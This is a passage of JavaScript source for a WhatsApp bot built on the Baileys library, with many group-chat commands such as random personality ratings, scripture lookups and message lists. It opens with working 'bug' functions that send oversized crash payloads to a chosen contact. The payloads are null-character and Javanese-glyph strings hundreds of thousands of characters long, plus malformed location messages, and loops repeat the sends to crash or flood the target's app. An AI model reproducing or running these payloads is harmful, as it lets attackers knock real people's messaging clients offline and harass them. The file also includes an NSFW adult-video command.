    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await Kev.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await Kev.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  Kev.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  Kev.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return Kev.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return Kev.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const kbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}
//======end bug functions========\\

		switch(isCommand) {
			case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
case 'handsomecheck':{
				if (!text) return replygckev(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: m.sender, 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
					break
case 'beautifulcheck':{
				if (!text) return replygckev(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${tik}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
					break
					case 'charactercheck':{
					if (!text) return replygckev(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const Kevinou =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = Kevinou[Math.floor(Math.random() * Kevinou.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Character Check : ${q}\nAnswer : *${taky}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁 \",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
				     break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Kev.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
			case 'rent-bot':
                replygckev(`Veuillez entrer ${prefix}proprio et discutez avec lui`)
                break
			case "id-groupe": case "idgc": case "groupid": {
if (!TontonKev) return KevStickOwner()
let getGroups = await Kev.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LA LISTE DE GROUPE SUIVANTE*\n\nNombre Total Groupes : ${anu.length} Groupes\n\n`
for (let x of anu) {
let metadata2 = await Kev.groupMetadata(x)
teks += `◉ Nom : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Membres : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygckev(teks + `Pour l utiliser veuillez entrer la commande ${prefix}pushcontact idgroupe|teks\n\nApre usage, veuillez tout d'abord copier l id`)
}
break
			case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Nom Du Repository: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Proprio: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await Kev.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'USD',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, { quoted: m })
    } else {
      await replygckev(`impossible de rafraichir les informations du repository`)
    }
  } catch (error) {
    console.error(error)
    await replygckev(`Repository indisponible pour le moment`)
  }
}
break
			case 'mon ip':
            case 'ip-bot':
                if (!TontonKev) return KevStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygckev("🔎 Mon  address IP publique est : " + ip);
                    })
                })
            break
            case 'requete': case 'reportbug': {
	if (!text) return replygckev(`Exemple : ${
        prefix + command
      } hey Tonton Kev la commande couple ne fonctionne pas`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hey ${m.pushName},Votre requete a ete transmise au proprio*.\n*Veuillez patienter...*`
            for (let i of owner) {
                Kev.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            Kev.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
			case 'reseaux-sociaux': 
        case 'sosmed': 
        case 'update':{
	const slides = [
    [
        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
        '', // Title
        `Veuillez suivre la chane youtube de Tonton Kev pour tout savoir sur les recentes mises a jour`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://youtube.com/@Kenvofc', // Command (URL in this case)
        'cta_url', // Button type
        'https://youtube.com/@Kenvofc' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
        '', // Title
        `Veuillez rejoindre le groupe telegram de Tonton Kev pour discuter sur les ameliorations et donner vos points de vue`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://t.me/+1e2AuejQBkxmNDg8', // Command (URL in this case)
        'cta_url', // Button type
        'https://t.me/+1e2AuejQBkxmNDg8' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
        '', // Title
        `Veuillez suivre le GitHub de Tonton Kev`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://github.com/kenvofc', // Command (URL in this case)
        'cta_url', // Button type
        'https://github.com/kenvofc' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
        '', // Title
        `Veuillez suivre Tonton Kev sur insta`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://www.instagram.com/kenv8070', // Command (URL in this case)
        'cta_url', // Button type
        'https://www.instagram.com/kenv8070' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        `Contact whatsApp de Tonton Kev`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://Wa.me/237656774511', // Command (URL in this case)
        'cta_url', // Button type
        'https://Wa.me/237656774511' // URL (used in image generation)
    ], 
];

const sendSlide = async (jid, title, message, footer, slides) => {
    const cards = slides.map(async slide => {
        const [
            image,
            titMess,
            boMessage,
            fooMess,
            textCommand,
            command,
            buttonType,
            url,
        ] = slide;
        let buttonParamsJson = {};
        switch (buttonType) {
            case "cta_url":
                buttonParamsJson = {
                    display_text: textCommand,
                    url: url,
                    merchant_url: url,
                };
                break;
            case "cta_call":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "cta_copy":
                buttonParamsJson = {
                    display_text: textCommand,
                    id: "",
                    copy_code: command,
                };
                break;
            case "cta_reminder":
            case "cta_cancel_reminder":
            case "address_message":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "send_location":
                buttonParamsJson = {};
                break;
             case "quick_reply":
             buttonParamsJson = { display_text: textCommand, id: command };
             break;
            default:
                break;
        }
        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
        return {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: boMessage,
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: fooMess,
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: titMess,
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                    { image: { url: image } },
                    { upload: Kev.waUploadToServer },
                )),
            }),
            nativeFlowMessage:
                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: buttonType,
                            buttonParamsJson: buttonParamsJsonString,
                        },
                    ],
                }),
        };
    });
    
    const msg = generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: message,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: footer,
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: title,
                            subtitle: title,
                            hasMediaAttachment: false,
                        }),
                        carouselMessage:
                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: await Promise.all(cards),
                            }),
                            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
                    }),
                },
            },
        },
        { quoted: m},
    );
    await Kev.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
    });
};
// Call the function with example parameters
sendSlide(m.chat, 'removed you', ownername, botname, slides);
}
break
			case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    replygckev(gitaVerse)
    if (json.audio_link) {
      Kev.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
			case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygckev(quranSurah)

    if (json.data.recitation.full) {
      Kev.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygckev(`Error: ${error.message}`)
  }
  }
  break
			case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🍁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🙏\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    replygckev(`Error: ${error.message}`)
  }
  }
  break
			case 'add-liste':
if (!TontonKev) return KevStickOwner()
if (!m.isGroup) return KevStickGroup()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygckev(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return replygckev(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await Kev.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(m.chat, args1, args2, true, `${mem}`, db_respon_list)
replygckev(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
replygckev(`Successful Add List With Key : *${args1}*`)
}
break
case 'supp-liste':
if (!TontonKev) return KevStickOwner()
if (!m.isGroup) return KevStickGroup()
if (db_respon_list.length === 0) return replygckev(`There is no message list in the database yet`)
if (!q) return replygckev(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(m.chat, q, db_respon_list)) return replygckev(`Item list by Name *${q}* not in the database!`)
delResponList(m.chat, q, db_respon_list)
replygckev(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
replygckev(teks)
}
break
			case 'mod-prefix':
                if (!TontonKev) return KevStickOwner()
                if (!text) return replygckev(`Example : ${prefix + command} #`)
                global.kevprefix = text
                replygckev(`Prefix successfully changed to ${text}`)
                break
			case 'addmsg': {
	if (!TontonKev) return KevStickOwner()
                if (!m.quoted) return replygckev('Reply Message You Want To Save In Database')
                if (!text) return replygckev(`Example : ${prefix + command} filename`)
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) return replygckev(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygckev(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return replygckev(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) return replygckev(`'${text}' not listed in the message list`)
                Kev.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygckev(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!TontonKev) return KevStickOwner()
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replygckev(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygckev(`Successfully deleted '${text}' from the message list`)
            }
	    break
			case 'mod-cmd': {
                if (!m.quoted) return replygckev('Veuillez repondre a un message!')
                if (!m.quoted.fileSha256) return replygckev('SHA256 Hash Missing')
                if (!text) return replygckev(`Pour Quelle Commande?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygckev('Vous n avez pas la permission de tonton Kev de modifier cette commande')
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygckev(`Effectuey!`)
            }
            break
case 'supp-cmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygckev(`No hashes`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygckev('Vous n avez pas la permission de tonton Kev de supprimer cette commande')             
                delete global.db.sticker[hash]
                replygckev(`Done!`)
            }
            break
case 'liste-cmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                Kev.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'bloquer-cmd': {
                if (!TontonKev) return KevStickOwner()
                if (!m.quoted) return replygckev('Veuillez repondre a un message !')
                if (!m.quoted.fileSha256) return replygckev('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return replygckev('Hash not found in database')
                global.db.sticker[hash].locked = !/^un/i.test(command)
                replygckev('Effectuey!')
            }
            break
			case 'hentai-vid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
                await KevStickWait()
                const { hentai } = require('./bibliotheque/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} Titre : ${result912.title}\n${themeemoji} Categorie : ${result912.category}\n${themeemoji} Type : ${result912.type}\n${themeemoji} Vues : ${result912.views_count}\n${themeemoji} Partages : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: result912.video_1 } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
